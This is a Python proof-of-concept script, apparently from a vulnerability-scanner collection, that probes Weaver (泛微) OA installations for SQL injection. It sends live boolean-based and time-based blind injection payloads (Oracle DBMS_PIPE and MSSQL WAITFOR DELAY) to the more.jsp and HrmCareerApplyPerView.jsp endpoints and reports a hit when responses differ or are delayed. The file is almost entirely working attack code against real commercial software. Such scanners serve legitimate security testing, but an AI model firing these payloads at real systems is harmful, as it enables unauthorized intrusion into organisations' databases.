# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time, re

class Vuln(ABVuln):
    vuln_id = 'weaver_OA_0025' # 平台漏洞编号，留空
    name = '泛微OA通用系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-08'  # 漏洞公布时间
    desc = '''
        泛微OA通用系统存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '泛微OA通用系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a8439002-60e0-4386-aa7e-3405b42ba82b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload = '/page/element/news/more.jsp?ebaseid=news&eid=-1'
            code1, head, res1, errcode, _ = hh.http(self.target + payload + '%20or%201%3D1')
            code2, head, res2, errcode, _ = hh.http(self.target + payload + '%20or%201%3D2')
            m1 = re.findall('</tr>',res1)
            m2 = re.findall('</tr>',res2)
            
            if code1==200 and code2==200 and m1!=m2:
                #security_hole(arg + payload + "   :sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            else:
                payloads = [
                    '/page/element/news/more.jsp?ebaseid=news&eid=1123%20AND%208609%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%28116%29%7C%7CCHR%28117%29%7C%7CCHR%28118%29%2C5%29',
                    '/page/element/news/more.jsp?ebaseid=news&eid=1123%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
                ]
                for payload1 in payloads:
                    payload2 = payload1.replace('5','0')
                    t1 = time.time()
                    code, head, res, errcode, _ = hh.http(self.target + payload1)
                    t2 = time.time()
                    code, head, res, errcode, _ = hh.http(self.target + payload2)
                    t3 = time.time()
                    if code == 200 and (2*t2 - t1 - t3 > 3):
                        #security_hole(arg + payload1 + "   :sql Injection")
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            
            payloads = [
                '/web/careerapply/HrmCareerApplyPerView.jsp?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
                '/web/careerapply/HrmCareerApplyPerView.jsp?id=1%20AND%208609%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%28116%29%7C%7CCHR%28117%29%7C%7CCHR%28118%29%2C5%29'
            ]
            for payload1 in payloads:
                payload2 = payload1.replace('5','0')
                t1 = time.time()
                code, head, res, errcode, _ = hh.http(self.target + payload1)
                t2 = time.time()
                code, head, res, errcode, _ = hh.http(self.target + payload2)
                t3 = time.time()
                if code == 200 and (2*t2 - t1 - t3 > 3):
                    #security_hole(arg + payload1 + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
